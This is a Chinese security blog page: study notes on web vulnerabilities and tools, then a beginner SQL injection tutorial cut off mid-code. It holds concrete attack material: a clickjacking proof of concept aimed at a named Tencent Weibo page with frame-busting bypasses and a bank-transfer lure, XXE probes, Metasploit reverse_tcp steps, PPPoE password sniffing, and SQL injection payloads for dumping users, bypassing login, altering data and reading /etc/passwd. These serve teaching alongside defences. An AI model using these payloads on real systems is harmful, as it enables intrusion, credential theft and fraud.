<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞：通常是由于网页代码中的上传路径变量过滤不严造成的。如果文件上传功能实现代码没有严格用户上传的文件后缀及文件类型，攻击者可通过web访问访问的目录上传任意代码，包括webshell，进而远程控制网络服务器。</span><br><span class="line">防御：严格限制校验上传文件，禁止上传恶意代码的条件。</span><br></pre></td></tr></table></figure>
<p>xxe外部实体注入漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XXE：在应用程序解析xml输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成a:文件读取b:命令执行c:内网端口扫描d:攻击内网网站e:发起DDos攻击等</span><br><span class="line">XXE漏洞检测：1）：检测xml是否被成功解析</span><br><span class="line">                &lt;!DOCTYPE ANY[</span><br><span class="line">                 &lt;!ENTITY name &quot;my name is xxx&quot;&gt;</span><br><span class="line">                 ]&gt;</span><br><span class="line">            2）：检测服务器是否支持DTD引用外部实体</span><br><span class="line">                 &lt;!ENTITY % name system &quot;http://localhost/index.html&quot;&gt;</span><br><span class="line">                 然后查看服务器上的日志判断，查看目标服务器向你的服务器发了一条xml请求。</span><br><span class="line">防御：a：使用开发者提供的禁用外部实体的方法</span><br><span class="line">         from xml import etree</span><br><span class="line">         xmlData=etree parse()</span><br><span class="line">     b:过滤关键词&lt;!ENTITY, system ,public</span><br></pre></td></tr></table></figure>
<p>中间人攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。</span><br><span class="line">    首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。</span><br><span class="line">    爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。</span><br><span class="line">防御：许多抵御中间人攻击的技术基于以下认证技术：</span><br><span class="line">     公钥基础建设</span><br><span class="line">在PKI方案中，主要防御中间人攻击的方案就是PKI的相互认证的机制。使用这样的机制并由应用程序验证用户，用户设备验证应用程序。但在某些流氓应用的情况下，这不是很有用，所以需要注意对流氓软件应与正规软件进行区分。</span><br><span class="line">更强力的相互认证，例如：</span><br><span class="line">     密钥（通常是高信息熵的密钥，从而更安全），或密码（通常是低的信息熵的密钥，从而降低安全性）</span><br><span class="line">延迟测试，例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</span><br><span class="line">     第二（安全的）通道的校验</span><br><span class="line">一次性密码本可以对中间人攻击免疫，这是在对一次密码本的安全性和信任上创建的。公钥体系的完整性通常必须以某种方式得到保障，但不需要进行保密。密码和共享密钥有额外的保密需求。公钥可以由证书颁发机构验证，这些公钥通过安全的渠道（例如，随Web浏览器或操作系统安装）分发。公共密钥也可以经由Web在线信任进行在线验证，可以通过安全的途径分发公钥（例如，通过面对面的途径分发公钥）。</span><br><span class="line">查看密钥交换协议以了解不同类别的使用不同密钥形式或密码以抵御中间人攻击的协议。</span><br></pre></td></tr></table></figure>
<p>点击劫持</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">原理：点击劫持（clickjacking）是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段。举例来说，如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是链入一购物网站。这样当用户试图“播放视频”时，实际是被诱骗而进入了一个购物网站。</span><br><span class="line">     大概有两种方式，一是攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；二是攻击者使用一张图片覆盖在网页，遮挡网页原有位置的含义；</span><br><span class="line">     点击劫持常见防御方法的绕过：</span><br><span class="line">JS防御 </span><br><span class="line">如if (top.location != self.location) &#123;top.location=self.location;&#125; </span><br><span class="line">&lt;iframe src=&quot;xxx&quot; security=&quot;restricted&quot; scrolling=&quot;no&quot; sandbox=&quot;&quot;&gt; </span><br><span class="line">security=&quot;restricted&quot;  为IE的禁止JS</span><br><span class="line">sandbox=&quot;&quot;  为HTML5的禁止JS</span><br><span class="line">这样就达到了bypass的效果，但有时候我们想劫持的按钮也是js的 那样就比较蛋疼了，但可以参考下面的方法。</span><br><span class="line">其他方法跳转进行防御</span><br><span class="line">只要是强制跳转到目标站的防御方法，都可以用此方法绕过。</span><br><span class="line">制作双重iframe，即最底层为目标站，二层为透明，这样还是能达到我们想要的效果。</span><br><span class="line">让点击劫持更猥琐的搭配:</span><br><span class="line">搭配输入框</span><br><span class="line">以前曾发现加拿大某银行可以进行点击劫持，但需要用户输入转账的银行卡号和银行，那么我们就可以放几个框，并诱惑用户在框里输入我的银行卡号和银行，这样用户看起来输入到我们的框里，实际上输入到了银行转账的页面当中。</span><br><span class="line">防御：X-FRAME-OPTIONS是目前最可靠的方法。X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。这个头有三个值：</span><br><span class="line">DENY // 拒绝任何域加载</span><br><span class="line">SAMEORIGIN // 允许同源域下加载</span><br><span class="line">ALLOW-FROM // 可以定义允许frame加载的页面地址</span><br><span class="line">php中设置：</span><br><span class="line">header(&quot;X-FRAME-OPTIONS:DENY&quot;);</span><br><span class="line"></span><br><span class="line">实例：腾讯微博刷粉</span><br><span class="line">poc:&lt;code&gt;&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;title&gt;点击劫持 POC&lt;/title&gt;</span><br><span class="line"> &lt;style&gt; iframe &#123; width: 1440px; height: 900px; position: absolute; top: -0px; left: -0px; z-index: 2; -moz-opacity: 0; opacity: 0; filter: alpha(opacity=0); &#125; </span><br><span class="line">button &#123; position: absolute; top: 250px; left: 770px; z-index: 1; width: 80px; height:20px; &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;button&gt;点击脱衣&lt;/button&gt; </span><br><span class="line">&lt;img src=&quot;http://b.hiphotos.baidu.com/image/pic/item/3ac79f3df8dcd1001341dbcd768b4710b8122f78.jpg&quot;&gt; &lt;iframe src=&quot;http://search.t.qq.com/user.php?pos=436&amp;k=东北保钓&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>
<p>一些安全工具的使用(sqlmap，Nmap，metasploit，Tcpdump，wireshark，burpsuite，awvs)？</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sqlmap: </span><br><span class="line">~ sqlmap -u url </span><br><span class="line">~ sqlmap -u url   --dbs //暴库</span><br><span class="line">~ sqlmap -u url   --current - db  //web当前所使用的数据库</span><br><span class="line">~ sqlmap -u url   --users  //列出数据库所有的用户</span><br><span class="line">tcpDump:</span><br><span class="line">~ tcpdump -i eth0 -s 0 -w file.pcap</span><br><span class="line">~ tcpdump -A -r a.cap //以ASCII格式打印出所有的分组并且读取此文件</span><br><span class="line">~ tcpdump -i eth0 port 22</span><br><span class="line">~ tcpdump -i eth0 tcp port 22 //只抓TCP，22端口的包，这里我们用nc来连一下另一台虚拟机的22端口</span><br><span class="line">~ tcpdump -i eth1 host 192.168.1.123 and port 80 -w /tmp/xxx.cap // 抓192.168.1.123的80端口的包 </span><br><span class="line">~ tcpdump -i eth1 host 192.168.1.123 and icmp -w /tmp/xxx.cap //抓192.168.1.123的icmp的包 </span><br><span class="line">~ tcpdump -i eth1 port 80 and vlan 1 -w /tmp/xxx.cap //抓vlan 1的包 </span><br><span class="line">~ tcpdump -i eth1 pppoes -w /tmp/xxx.cap //抓pppoe的密码 </span><br><span class="line">Nmap:</span><br><span class="line">~ nmap -sP target-ip //检测存活主机</span><br><span class="line">~ nmap -sT target-ip //检测端口开放情况</span><br><span class="line">~ nmap -sS -o target-ip //操作系统识别</span><br><span class="line">~ nmap -sT -p 80 -oG -ip |grep open //列出开放指定端口的主机列表</span><br><span class="line">~ nmap -sV -p 80 thief-one //列出服务器类型</span><br><span class="line">metasploit+Nmap:</span><br><span class="line">~ nmap -sT -A --script=smb-check -vulns -po target-ip //扫描</span><br><span class="line">~ msfconsole</span><br><span class="line">~ show auxiliary</span><br><span class="line">~ show option</span><br><span class="line">~ search ms07-010</span><br><span class="line">~ search exploits</span><br><span class="line">~ use window/smb/ms07-010-netapi</span><br><span class="line">~ show targets</span><br><span class="line">~ show payloads</span><br><span class="line">~ use payload +载荷revese_tcp</span><br><span class="line">~ show option</span><br><span class="line">~ set  Rhost target-ip</span><br><span class="line">~ set Lhost 自己的ip</span><br><span class="line">~ set Lport 8080</span><br></pre></td></tr></table></figure>
<p>网络知识</p>
<p>http知识：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">http的请求报文：http的版本号，http方法(get,post,HEAD....),url,请求头(被请求的文件类型)，实体头</span><br><span class="line">HTTP的响应报文：http版本号，状态码，响应头，实体头，内容</span><br><span class="line">HTTP的作用：1）：确认通讯双方的身份 2）：建立安全通道，保证数据安全传输</span><br><span class="line">get，post，head的区别？</span><br><span class="line">答： 如果请求表单，新闻组，BBS，邮件组数和数据库字段&quot;索引&quot;就用post替换get，表示请求的是一个较大的数据。head只请求web页面的信息，不返回信息体，用于验证该web页面。get请求web页面的信息。</span><br><span class="line">HTTP的状态码</span><br><span class="line">  下面是常见的HTTP状态码：</span><br><span class="line">200 - 请求成功</span><br><span class="line">301 - 资源（网页等）被永久转移到其它URL</span><br><span class="line">404 - 请求的资源（网页等）不存在</span><br><span class="line">500 - 内部服务器错误</span><br><span class="line">HTTP状态码分类</span><br><span class="line">HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</span><br><span class="line">HTTP状态码分类</span><br><span class="line">分类	分类描述</span><br><span class="line">1**	信息，服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2**	成功，操作被成功接收并处理</span><br><span class="line">3**	重定向，需要进一步的操作以完成请求</span><br><span class="line">4**	客户端错误，请求包含语法错误或无法完成请求</span><br><span class="line">5**	服务器错误，服务器在处理请求的过程中发生了错误</span><br><span class="line">HTTP状态码列表:</span><br><span class="line">HTTP状态码列表</span><br><span class="line">状态码	状态码英文名称	中文描述</span><br><span class="line">100	Continue	继续。客户端应继续其请求</span><br><span class="line">101	Switching Protocols	切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</span><br><span class="line">200	OK	请求成功。一般用于GET与POST请求</span><br><span class="line">201	Created	已创建。成功请求并创建了新的资源</span><br><span class="line">202	Accepted	已接受。已经接受请求，但未处理完成</span><br><span class="line">203	Non-Authoritative Information	非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</span><br><span class="line">204	No Content	无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</span><br><span class="line">205	Reset Content	重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</span><br><span class="line">206	Partial Content	部分内容。服务器成功处理了部分GET请求</span><br><span class="line">300	Multiple Choices	多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</span><br><span class="line">301	Moved Permanently	永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</span><br><span class="line">302	Found	临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</span><br><span class="line">303	See Other	查看其它地址。与301类似。使用GET和POST请求查看</span><br><span class="line">304	Not Modified	未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</span><br><span class="line">305	Use Proxy	使用代理。所请求的资源必须通过代理访问</span><br><span class="line">306	Unused	已经被废弃的HTTP状态码</span><br><span class="line">307	Temporary Redirect	临时重定向。与302类似。使用GET请求重定向</span><br><span class="line">400	Bad Request	客户端请求的语法错误，服务器无法理解</span><br><span class="line">401	Unauthorized	请求要求用户的身份认证</span><br><span class="line">402	Payment Required	保留，将来使用</span><br><span class="line">403	Forbidden	服务器理解请求客户端的请求，但是拒绝执行此请求</span><br><span class="line">404	Not Found	服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置&quot;您所请求的资源无法找到&quot;的个性页面</span><br><span class="line">405	Method Not Allowed	客户端请求中的方法被禁止</span><br><span class="line">406	Not Acceptable	服务器无法根据客户端请求的内容特性完成请求</span><br><span class="line">407	Proxy Authentication Required	请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</span><br><span class="line">408	Request Time-out	服务器等待客户端发送的请求时间过长，超时</span><br><span class="line">409	Conflict	服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</span><br><span class="line">410	Gone	客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</span><br><span class="line">411	Length Required	服务器无法处理客户端发送的不带Content-Length的请求信息</span><br><span class="line">412	Precondition Failed	客户端请求信息的先决条件错误</span><br><span class="line">413	Request Entity Too Large	由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</span><br><span class="line">414	Request-URI Too Large	请求的URI过长（URI通常为网址），服务器无法处理</span><br><span class="line">415	Unsupported Media Type	服务器无法处理请求附带的媒体格式</span><br><span class="line">416	Requested range not satisfiable	客户端请求的范围无效</span><br><span class="line">417	Expectation Failed	服务器无法满足Expect的请求头信息</span><br><span class="line">500	Internal Server Error	服务器内部错误，无法完成请求</span><br><span class="line">501	Not Implemented	服务器不支持请求的功能，无法完成请求</span><br><span class="line">502	Bad Gateway	充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</span><br><span class="line">503	Service Unavailable	由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</span><br><span class="line">504	Gateway Time-out	充当网关或代理的服务器，未及时从远端服务器获取请求</span><br><span class="line">505	HTTP Version not supported	服务器不支持请求的HTTP协议的版本，无法完成处理</span><br></pre></td></tr></table></figure>
<p>tcp知识：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.tcp的三次握手，四次挥手</span><br><span class="line">2.tcp的可靠性实现机制</span><br><span class="line">  分片重组，超时重传，有错丢弃，滑动窗口，检验和认证</span><br><span class="line">3.TCP：全双工，面向连接的，可靠的，基于字节流的;</span><br><span class="line">  UDP：无连接的，面向报文的，尽最大努力交付;</span><br><span class="line">4.各协议首部长度:IP:20字节     TCP:20字节      UDP:8字节</span><br><span class="line">5.http与https的区别：</span><br><span class="line">  a:url不同；b:http采用80端口，https采用443端口；</span><br><span class="line">  C：https协议需要到ca申请证书，一般免费证书很少，需要交费。</span><br><span class="line">  d:http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</span><br><span class="line">  e:http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议。</span><br></pre></td></tr></table></figure>
<p>TCP/IP协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.7层/5层模型的每层代表协议</span><br><span class="line">2.TCP/IP体系，和HTTP的关系</span><br><span class="line">  TCP/IP 是网络核心层，HTTP是基于网络应用层协议。</span><br><span class="line">  HTTP支持客户端/服务器模式；简单、灵活；无连接、无状态；无连接是指每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。无状态是指协议对事务处理的没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可以导致每次连接传送的数据量增大。在服务器不需要先前信息时它的应答就较快。</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>谢谢浏览！！！</strong></p>
<hr>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web-security/">web security</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/04/12/SQL注入原理（基础篇）/"><span>SQL注入原理（基础篇）</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/04/12/SQL注入原理（基础篇）/" rel="bookmark">
        <time class="entry-date published" datetime="2018-04-12T12:31:02.000Z">
          2018-04-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="SQL注入原理（基础篇）"><a href="#SQL注入原理（基础篇）" class="headerlink" title="SQL注入原理（基础篇）"></a>SQL注入原理（基础篇）</h2><p>​       <strong>(重点是对sql 原理的理解）</strong>进行sql 注入，攻击者能够直接对服务器实施主动攻击，而不需要用户的参与。适合小白入门，大牛们请绕开！</p>
<ol>
<li>数据库内的信息全部被外界窃取</li>
<li>数据库中的内容被篡改</li>
<li>登录认证被绕过</li>
<li>其他，例如服务器上的文件被读取或者修改，服务器上的程序被执行等</li>
</ol>
<p><strong>0x00 UNION联合查询</strong></p>
<p>我们先来看看含有sql 注入漏洞的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  session_start();</span><br><span class="line">  header(&quot;Content-Type:text/html;charset=UTF-8&quot;);</span><br><span class="line">  $author = $_GET[&apos;author&apos;];</span><br><span class="line">  $con = pg_connect(&quot;host=localhost dbname=xxx user=xxx password=xxx&quot;);</span><br><span class="line">  $sql = &quot;SELECT * FROM books WHERE author =&apos;$author&apos; ORDER BY id&quot;;</span><br><span class="line">  $rs =pg_query($con,$sql); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>sql 注入的语句</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$author-&gt;'+union+select+id,pwd,name,addr,null,null,null+from+users;</span><br></pre></td></tr></table></figure>
<p><strong>0x01 sql 注入绕过认证</strong></p>
<p>认证页面.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录认证&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;认证.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      username&lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;xxx&quot;&gt;&lt;br&gt;</span><br><span class="line">      password&lt;input type=&quot;text&quot; name=&quot;PWD&quot; value=&quot;xxx&quot;&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;login&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>认证页面.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   session_start();</span><br><span class="line">   header(&quot;Content-Type:text/html;charset=UTF-8&quot;);</span><br><span class="line">   $id = @$_POST[&apos;ID&apos;]; //用户id名</span><br><span class="line">   $pwd = @$_POST[&apos;PWD&apos;]; //用户密码</span><br><span class="line">   $con = pg_connect(&quot;host=localhost dbname=xxx user=xxx password=xxx&quot;);</span><br><span class="line">   $sql = &quot;SELECT * FROM user WHERE id =&apos;$id&apos; and PWD =&apos;$pwd&apos;&quot;;</span><br><span class="line">   $rs = pg_query($con,$sql);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      if (pg_num_rows($rw)&gt;0)&#123;</span><br><span class="line">          $_SESSION[&apos;id&apos;] =$id;</span><br><span class="line">          echo &apos;登录成功&apos;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">          echo &apos;登录失败&apos;</span><br><span class="line">      &#125;</span><br><span class="line">    pg_close($con);</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>绕过语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username="xxxxx"</span><br><span class="line">password="'OR'a'='a"</span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> =<span class="string">'xxxxx'</span> <span class="keyword">and</span> pwd =<span class="string">" OR'a'='a'</span></span><br></pre></td></tr></table></figure>
<p>0x02 sql 注入攻击篡改数据</p>
<p>篡改语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">table</span> <span class="keyword">set</span> title=<span class="string">'&lt;i&gt;xxx&lt;/i&gt;'</span><span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure>
<p>拼接后的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> XXX <span class="keyword">WHERE</span> author=<span class="string">";update table set title='&lt;i&gt;xxx&lt;/i&gt;'where id='1'--'ORDER BY id</span></span><br></pre></td></tr></table></figure>
<p><strong>0x03 读取文件</strong></p>
<p>产生如下URL来拷贝/ect/passwd 的内容到xxx表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;copy xxx(title) form '/ect/passwd';</span><br><span class="line">....php?author='or+author+is+null<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>​        copy语句是PostgreSQL数据库的扩展功能，能够将问价中的内容存入表中。此例中/ect/passwd就被存入了books表的title列。执行copy 语句需要PostgreSQL的管理员权限以连接数据库。</p>
<p><strong>0x04 sql 安全解决方案</strong></p>
<p>首先sql注入产生的原因：程序的开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致可以通过全局变量post/get提交一些sql语句正常执行。</p>
<ol>
<li><p>从代码角度：</p>
<p>​     a：静态占位符:格式固定/定位</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span> <span class="string">'MDB.php'</span>;</span><br><span class="line">  header(<span class="string">"Content-Type:text/html;charset=UTF-8"</span>);</span><br><span class="line">  $author = $_GET[<span class="string">'author'</span>];</span><br><span class="line">  <span class="comment">//连接数据库时指定字符编码为UTF-8</span></span><br><span class="line">  $mdb =MDB::connect(<span class="string">'pgsql://xxx?charset=utf8'</span>);</span><br><span class="line">  <span class="comment">//使用占位符</span></span><br><span class="line">  $sql =<span class="string">"SELECT * FROM xxx WHERE author=? ORDER BY id"</span>;</span><br><span 